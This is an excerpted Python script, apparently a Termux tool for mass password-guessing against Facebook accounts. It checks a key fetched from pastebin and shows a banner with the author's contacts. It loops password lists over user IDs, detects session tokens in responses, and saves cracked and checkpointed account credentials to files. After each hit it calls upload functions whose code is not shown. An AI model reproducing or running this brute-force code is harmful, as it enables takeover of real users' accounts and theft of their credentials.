...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://pastebin.com/raw/VPm79mat"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/FOURKANUDDIN123")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ Facebook🤲https://www.facebook.com/FOURKANUDDIN123")
	subprocess.check_output(["am", "start", "https://www.facebook.com/FOURKANUDDIN123"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://pastebin.com/raw/VPm79mat').text
			if basesplit in plr:
				key = basesplit
...
\033[41m\033[1;37m[Devil]   [kazi]     [samir]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : kazi samir \033[1;32m[samir✌]         │
\033[1;34m│ [✓] GITHUB   :  \033[41m\033[1;37mhttp://github.com/kazisamir4\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  01840261060      │
...
""")
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: samir@gamigmail.com): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [N4Y66M] : %s/%s -> \033[0;92m [ N4Y66M-OK:%s ]- \033[0;91m[N4Y66M-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[samir-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [samir-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[samir-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [samir-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
